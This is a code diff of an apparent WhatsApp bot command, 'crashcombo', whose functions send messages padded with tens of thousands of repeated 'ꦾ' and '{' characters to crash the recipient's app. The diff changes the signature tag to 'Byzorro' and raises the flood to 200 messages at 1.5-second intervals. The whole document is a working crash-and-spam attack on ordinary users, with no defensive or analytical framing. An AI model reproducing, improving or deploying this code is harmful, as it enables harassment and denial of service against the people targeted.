@@ -3,7 +3,7 @@ let handler = async (m, { conn }) => {
   const delay = (ms) => new Promise((res) => setTimeout(res, ms));
 
   async function Crashui(target) {
-    let Crash = "༑⌁⃰Dapzy Is hereཀ‌‌🦠" + "ꦾ".repeat(65000);
+    let Crash = "༑⌁⃰Byzorroཀ‌‌🦠" + "ꦾ".repeat(65000);
     await conn.relayMessage(
       target,
       {
@@ -48,7 +48,7 @@ let handler = async (m, { conn }) => {
               },
             },
             body: {
-              text: "༑⌁⃰Dapzy Is hereཀ‌‌🦠" + "ꦾ".repeat(35000),
+              text: "༑⌁⃰Byzorroཀ‌‌🦠" + "ꦾ".repeat(35000),
             },
             nativeFlowMessage: {
               messageParamsJson: "{".repeat(15000),
@@ -76,25 +76,19 @@ let handler = async (m, { conn }) => {
     });
   }
 
-  // Secuencia de 100 mensajes en 5 min
-  for (let i = 0; i < 25; i++) {
-    await Crashui(target);
-    await delay(3000);
-  }
-  for (let i = 0; i < 25; i++) {
-    await ForceXsystem(conn, target);
-    await delay(3000);
-  }
-  for (let i = 0; i < 25; i++) {
-    await Crashui(target);
-    await delay(3000);
-  }
-  for (let i = 0; i < 25; i++) {
-    await ForceXsystem(conn, target);
-    await delay(3000);
+  // 200 mensajes = 4 ciclos (25+25) * 4
+  for (let cycle = 0; cycle < 4; cycle++) {
+    for (let i = 0; i < 25; i++) {
+      await Crashui(target);
+      await delay(1500);
+    }
+    for (let i = 0; i < 25; i++) {
+      await ForceXsystem(conn, target);
+      await delay(1500);
+    }
   }
 
-  m.reply("✅ Secuencia completada.");
+  m.reply("✅ Secuencia de 200 mensajes completada.");
 };
 
 handler.command = /^crashcombo$/i;
